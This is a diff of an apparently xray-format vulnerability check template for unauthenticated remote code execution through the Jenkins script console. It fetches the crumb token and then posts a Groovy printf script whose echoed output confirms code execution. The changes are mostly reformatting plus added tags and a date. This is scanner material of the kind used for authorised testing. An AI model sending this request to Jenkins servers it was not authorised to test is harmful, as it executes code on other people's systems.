@@ -1,32 +1,33 @@
 id: jenkins-unauthorized-rce
 
 info:
-    name: Jenkins unauthorized rce
-    author: MrP01ntSun(https://github.com/MrPointSun)
-    severity: critical
-    verified: true
-    reference:
-        - https://www.cnblogs.com/yuzly/p/11255609.html
-        - https://blog.51cto.com/13770310/2156663
+  name: Jenkins unauthorized rce
+  author: MrP01ntSun
+  severity: critical
+  verified: true
+  reference:
+    - https://www.cnblogs.com/yuzly/p/11255609.html
+    - https://blog.51cto.com/13770310/2156663
+  tags: jenkins,rce,unauth
+  created: 2023/07/07
 
 set:
-    r1: randomInt(1000, 9999)
-    r2: randomInt(1000, 9999)
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /script
-        expression: response.status == 200
-        output:
-            search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
-            var: search["var"]
-    r1:
-        request:
-            method: POST
-            path: /script
-            body: |
-                script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
-        expression: response.status == 200 && response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
+  r0:
+    request:
+      method: GET
+      path: /script
+    expression: response.status == 200
+    output:
+      search: '"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);".bsubmatch(response.body)'
+      var: search["var"]
+  r1:
+    request:
+      method: POST
+      path: /script
+      body: |
+        script=printf%28%27{{r1}}%25%25{{r2}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1) + "%" + string(r2)))
 expression: r0() && r1()
-
